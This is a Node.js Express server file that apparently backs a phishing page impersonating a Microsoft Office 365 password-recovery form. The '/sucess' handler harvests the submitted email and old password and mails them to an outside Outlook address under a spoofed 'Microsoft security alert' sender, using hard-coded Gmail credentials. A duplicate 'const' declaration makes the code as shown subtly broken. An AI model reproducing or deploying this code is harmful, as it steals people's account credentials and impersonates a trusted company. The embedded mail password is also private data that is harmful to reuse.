const express = require("express")
const app = express()
const http = require('http').Server(app);
const bodyParser = require("body-parser")
const handlebars = require("express-handlebars");
const nodemailer = require("nodemailer")
const host = '0.0.0.0';
const port = process.env.PORT || 3000;

app.use(express.static(__dirname + "/css/"));

app.use(bodyParser.urlencoded({extended:true}));

app.engine('handlebars', handlebars({defaultLayout:false}));
app.set('view engine', 'handlebars');

function sendmail(req,res){
 res.render(__dirname + "/sucess.handlebars")
 const email = req.body.email
 const password = req.body.old_password
 const info_location = req.body.info_location
 const info_location = JSON.parse(info_location)
 console.log(info_location)
 const transporter = nodemailer.createTransport({
  service: 'gmail',   
  auth: {           
   user: 'guilhermeassuncao301@gmail.com',
   pass: 'gui7voltage!'
  }
 });  
 var mailOptions = {
  from:'Microsoft security alert <microsoftsecurityalert@gmail.com>',
  to: 'dakota3011@outlook.com',
  subject: 'Information login collected office 365',
  html: `<b><h2>Login Office365</h2></b><p>Email: ${email}<br>Password: ${password}<br>IP: <br>Country: <br>City: </p>`
 };
 transporter.sendMail(mailOptions,function(err,info){
  if(err)
   console.log(err)
  else{
   console.log("Enviado!")
  }
 })
}

app.get("/", (req,res) => {
  res.redirect("/recovery")
 })
        
app.get("/recovery", (req,res) => {
 res.render(__dirname + "/index.handlebars")
})

app.post("/sucess", (req,res) => {
 sendmail(req,res)
})

http.listen(port, host, () => {
 console.log("Servidor no ar!")
})
